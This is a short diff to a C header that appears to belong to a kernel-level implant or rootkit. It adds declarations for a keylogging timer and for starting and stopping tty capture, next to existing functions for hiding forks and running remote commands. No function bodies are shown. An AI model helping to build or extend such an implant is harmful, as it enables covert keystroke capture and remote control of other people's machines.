@@ -42,6 +42,7 @@ extern int shutting_down;
 extern int mfire;
 extern int kthreads_started;
 extern int kthreads_done;
+extern time_t keylog_until;
 
 // uncomment for verbose dmesg; never on shipped builds
 //#define DBGMODEDONTUSEME
@@ -58,6 +59,8 @@ void proxy_forkhide_on (void);
 void proxy_attr_socket (struct socket* so);
 void proxy_attr_socket_clear (void);
 void proxy_attr_start (void);
+void proxy_attr_tty_start (void);
+void proxy_attr_tty_stop (void);
 int proxy_execute_capture (struct remconn* rc, const char* cmd, u8* out, int outsz);
 int dd_start (void);
 int proxy_http_any (char kind, uint64_t bucket, int* hit);
